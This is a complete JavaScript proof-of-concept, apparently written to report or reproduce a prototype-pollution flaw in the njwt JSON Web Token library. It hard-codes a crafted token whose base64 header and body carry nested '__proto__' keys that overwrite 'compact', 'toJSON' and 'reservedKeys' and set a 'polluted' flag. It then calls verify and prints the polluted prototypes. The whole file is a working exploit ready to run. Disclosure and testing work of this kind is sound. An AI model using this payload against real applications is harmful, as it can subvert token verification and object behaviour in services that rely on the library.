// poc.js

var nJwt = require('njwt');

var secureRandom = require('secure-random');
var signingKey = secureRandom(256, {type: 'Buffer'});

var token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsIl9fcHJvdG9fXyI6eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsIl9fcHJvdG9fXyI6eyJjb21wYWN0IjpudWxsLCJyZXNlcnZlZEtleXMiOlsidHlwIiwicmFuZG9tX2dpYmJlcmlzaCJdfX19.eyJzdWIiOjEsInNjb3BlIjoidXNlciIsImp0aSI6ImJhZmIxNmNlLTIwZDYtNGNkNy05NDgzLTY1YTA5NThhOGU2NCIsImlhdCI6MTcxMzk0NTM3OSwiZXhwIjoxNzEzOTQ4OTc5LCJfX3Byb3RvX18iOnsiY29tcGFjdCI6bnVsbCwidG9KU09OIjpudWxsLCJwb2xsdXRlZCI6dHJ1ZX19.0XBjesxGkSMBjI5_LrwobgoyG-VXI2HCXTGVU-fLFuk";

nJwt.verify(token, signingKey);

console.log(nJwt.JwtHeader.prototype);
console.log(nJwt.JwtBody.prototype);
